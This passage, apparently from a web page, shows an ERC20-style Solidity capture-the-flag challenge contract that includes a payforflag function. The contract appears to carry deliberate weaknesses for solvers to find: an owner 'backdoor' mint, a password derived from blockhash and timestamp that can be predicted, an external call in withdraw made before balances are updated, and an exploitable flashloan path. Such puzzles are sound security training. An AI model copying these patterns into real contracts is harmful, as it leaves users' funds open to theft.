comment">/**</span></pre></td></tr><tr><td data-num="84"></td><td><pre>     * @dev Returns the name of the token.</pre></td></tr><tr><td data-num="85"></td><td><pre>     */</pre></td></tr><tr><td data-num="86"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> virtual override <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="87"></td><td><pre>        <span class="token keyword">return</span> _name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="88"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="89"></td><td><pre></pre></td></tr><tr><td data-num="90"></td><td><pre>   </pre></td></tr><tr><td data-num="91"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> virtual override <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="92"></td><td><pre>        <span class="token keyword">return</span> _symbol<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="93"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="94"></td><td><pre></pre></td></tr><tr><td data-num="95"></td><td><pre>    </pre></td></tr><tr><td data-num="96"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">decimals</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> virtual override <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="97"></td><td><pre>        <span class="token keyword">return</span> <span class="token number">18</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="98"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="99"></td><td><pre></pre></td></tr><tr><td data-num="100"></td><td><pre>    <span class="token comment">/**</span></pre></td></tr><tr><td data-num="101"></td><td><pre>     * @dev See &#123;IERC20-totalSupply&#125;.</pre></td></tr><tr><td data-num="102"></td><td><pre>     */</pre></td></tr><tr><td data-num="103"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">totalSupply</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> virtual override <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="104"></td><td><pre>        <span class="token keyword">return</span> _totalSupply<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="105"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="106"></td><td><pre></pre></td></tr><tr><td data-num="107"></td><td><pre>    <span class="token comment">/**</span></pre></td></tr><tr><td data-num="108"></td><td><pre>     * @dev See &#123;IERC20-balanceOf&#125;.</pre></td></tr><tr><td data-num="109"></td><td><pre>     */</pre></td></tr><tr><td data-num="110"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> account<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> virtual override <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="111"></td><td><pre>        <span class="token keyword">return</span> _balances<span class="token punctuation">[</span>account<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="112"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="113"></td><td><pre></pre></td></tr><tr><td data-num="114"></td><td><pre>    </pre></td></tr><tr><td data-num="115"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> virtual override <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="116"></td><td><pre>        <span class="token builtin">address</span> owner <span class="token operator">=</span> <span class="token function">_msgSender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="117"></td><td><pre>        <span class="token function">_transfer</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="118"></td><td><pre>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="119"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="120"></td><td><pre></pre></td></tr><tr><td data-num="121"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="122"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_depositd<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"you can only deposit once"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="123"></td><td><pre>        _depositd<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="124"></td><td><pre>        ethbalances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="125"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="126"></td><td><pre></pre></td></tr><tr><td data-num="127"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="128"></td><td><pre>        <span class="token keyword">return</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">;</span>                   </pre></td></tr><tr><td data-num="129"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="130"></td><td><pre></pre></td></tr><tr><td data-num="131"></td><td><pre></pre></td></tr><tr><td data-num="132"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">setbackup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> onlyowner <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="133"></td><td><pre>        owner <span class="token operator">=</span> backup<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="134"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="135"></td><td><pre></pre></td></tr><tr><td data-num="136"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">ownerbackdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="137"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="138"></td><td><pre>        <span class="token function">_mint</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="139"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="140"></td><td><pre></pre></td></tr><tr><td data-num="141"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">auth1</span><span class="token punctuation">(</span><span class="token builtin">uint</span> pass_<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="142"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>pass_ <span class="token operator">==</span> secret<span class="token punctuation">,</span> <span class="token string">"auth fail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="143"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_authd<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"already authd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="144"></td><td><pre>        _auth_one<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="145"></td><td><pre>        _authd<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="146"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="147"></td><td><pre></pre></td></tr><tr><td data-num="148"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">auth2</span><span class="token punctuation">(</span><span class="token builtin">uint</span> pass_<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="149"></td><td><pre>        <span class="token builtin">uint</span> pass <span class="token operator">=</span> <span class="token builtin">uint</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span><span class="token function">blockhash</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="150"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>pass <span class="token operator">==</span> pass_<span class="token punctuation">,</span> <span class="token string">"password error, auth fail"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="151"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_auth_one<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"need pre auth"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="152"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_authd<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"already authd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="153"></td><td><pre>        _authd<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="154"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="155"></td><td><pre></pre></td></tr><tr><td data-num="156"></td><td><pre></pre></td></tr><tr><td data-num="157"></td><td><pre>    </pre></td></tr><tr><td data-num="158"></td><td><pre></pre></td></tr><tr><td data-num="159"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">payforflag</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> mid<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> b64email<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="160"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_flag<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="161"></td><td><pre>        <span class="token keyword">emit</span> <span class="token function">sendflag</span><span class="token punctuation">(</span>mid<span class="token punctuation">,</span> b64email<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="162"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="163"></td><td><pre></pre></td></tr><tr><td data-num="164"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">flashloan</span><span class="token punctuation">(</span>SignCoupon <span class="token keyword">calldata</span> scoupon<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="165"></td><td><pre></pre></td></tr><tr><td data-num="166"></td><td><pre></pre></td></tr><tr><td data-num="167"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">.</span>loankey <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"loan key error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="168"></td><td><pre>        </pre></td></tr><tr><td data-num="169"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"hacker get out"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="170"></td><td><pre>        Coupon <span class="token keyword">memory</span> coupon <span class="token operator">=</span> scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="171"></td><td><pre>        Signature <span class="token keyword">memory</span> sig <span class="token operator">=</span> scoupon<span class="token punctuation">.</span>signature<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="172"></td><td><pre>        c<span class="token operator">=</span>coupon<span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="173"></td><td><pre>        </pre></td></tr><tr><td data-num="174"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_authd<span class="token punctuation">[</span>scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">.</span>buser<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"need pre auth"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="175"></td><td><pre>        </pre></td></tr><tr><td data-num="176"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_loand<span class="token punctuation">[</span>scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">.</span>buser<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"you have already loaned"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="177"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">.</span>amount <span class="token operator">&lt;=</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token string">"loan amount error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="178"></td><td><pre></pre></td></tr><tr><td data-num="179"></td><td><pre>        _loand<span class="token punctuation">[</span>scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">.</span>buser<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="180"></td><td><pre>        </pre></td></tr><tr><td data-num="181"></td><td><pre>        _ebalances<span class="token punctuation">[</span>scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">.</span>buser<span class="token punctuation">]</span> <span class="token operator">+=</span> scoupon<span class="token punctuation">.</span>coupon<span class="token punctuation">.</span>amount<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="182"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="183"></td><td><pre></pre></td></tr><tr><td data-num="184"></td><td><pre></pre></td></tr><tr><td data-num="185"></td><td><pre></pre></td></tr><tr><td data-num="186"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">profit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="187"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_profited<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="188"></td><td><pre>        _profited<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="189"></td><td><pre>        <span class="token function">_transfer</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="190"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="191"></td><td><pre></pre></td></tr><tr><td data-num="192"></td><td><pre>    </pre></td></tr><tr><td data-num="193"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">borrow</span><span class="token punctuation">(</span><span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="194"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>amount <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="195"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_profited<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="196"></td><td><pre>        _profited<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="197"></td><td><pre>        <span class="token function">_transfer</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="198"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="199"></td><td><pre></pre></td></tr><tr><td data-num="200"></td><td><pre></pre></td></tr><tr><td data-num="201"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">buy</span><span class="token punctuation">(</span><span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="202"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>amount <span class="token operator">&lt;=</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token string">"max buy count is 300"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="203"></td><td><pre>        <span class="token builtin">uint</span> price<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="204"></td><td><pre>        <span class="token builtin">uint</span> ethmount <span class="token operator">=</span> _ebalances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="205"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ethmount <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="206"></td><td><pre>            price <span class="token operator">=</span> <span class="token number">1000000</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="207"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>ethmount <span class="token operator">>=</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> ethmount <span class="token operator">&lt;=</span> <span class="token number">233</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="208"></td><td><pre>            price <span class="token operator">=</span> <span class="token number">10000</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="209"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="210"></td><td><pre>            price <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="211"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="212"></td><td><pre>        <span class="token builtin">uint</span> payment <span class="token operator">=</span> amount <span class="token operator">*</span> price<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="213"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>payment <span class="token operator">&lt;=</span> ethmount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="214"></td><td><pre>        _ebalances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> payment<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="215"></td><td><pre>        <span class="token function">_transfer</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="216"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="217"></td><td><pre></pre></td></tr><tr><td data-num="218"></td><td><pre></pre></td></tr><tr><td data-num="219"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">sale</span><span class="token punctuation">(</span><span class="token builtin">uint</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="220"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> amount<span class="token punctuation">,</span> <span class="token string">"fail to sale"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="221"></td><td><pre>        <span class="token builtin">uint</span> earn <span class="token operator">=</span> amount <span class="token operator">*</span> tokenprice<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="222"></td><td><pre>        <span class="token function">_transfer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> owner<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="223"></td><td><pre>        _ebalances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> earn<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="224"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="225"></td><td><pre></pre></td></tr><tr><td data-num="226"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="227"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>ethbalances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="228"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>_ebalances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">1812</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="229"></td><td><pre>        <span class="token keyword">payable</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">.</span>call<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span><span class="token number">100000000000000000</span> wei<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="230"></td><td><pre>        </pre></td></tr><tr><td data-num="231"></td><td><pre>        _ebalances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="232"></td><td><pre>        _flag<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="233"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="234"></td><td><pre></pre></td></tr><tr><td data-num="235"></td><td><pre></pre></td></tr><tr><td data-num="236"></td><td><pre>    <span class="token comment">/**</span></pre></td></tr><tr><td data-num="237"></td><td><pre>     * @dev See &#123;IERC20-allowance&#125;.</pre></td></tr><tr><td data-num="238"></td><td><pre>     */</pre></td></tr><tr><td data-num="239"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">allowance</span><span class="token punctuation">(</span><span class="token builtin">address</span> owner<span class="token punctuation">,</span> <span class="token builtin">address</span> spender<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> virtual override <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="240"></td><td><pre>        <span class="token keyword">return</span> _allowances<span class="token punctuation">[</span>owner<span class="token punctuation">]</span><span class="token punctuation">[</span>spender<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="241"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="242"></td><td><pre></pre></td></tr><tr><td data-num="243"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> virtual override <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="244"></td><td><pre>        <span class="token builtin">address</span> owner <span class="token operator">=</span> <span class="token function">_msgSender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="245"></td><td><pre>        <span class="token function">_approve</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="246"></td><td><pre>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="247"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="248"></td><td><pre>   </pre></td></tr><tr><td data-num="249"></td><td><pre>    <span class="token keyword">function</span> <span class="token function">transferFrom</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="250"></td><td><pre>        <span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="251"></td><td><pre>        <span class="token builtin">address</span> to<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="252"></td><td><pre>        <span class="token builtin">uint256</span> amount</pre></td></tr><tr><td data-num="253"></td><td><pre>    <span class="token punctuation">)</span> <span class="token keyword">public</span> virtual override <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="254"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 不允许被 owner 以外调用</span></pre></td></tr><tr><td data-num="255"></td><td><pre>        <span class="token builtin">address</span> spender <span class="token operator">=</span> <span class="token function">_msgSender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="256"></td><td><pre>        <span class="token function">_spendAllowance</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> spender<span class="token punctuation">,</span> amount<span class="token 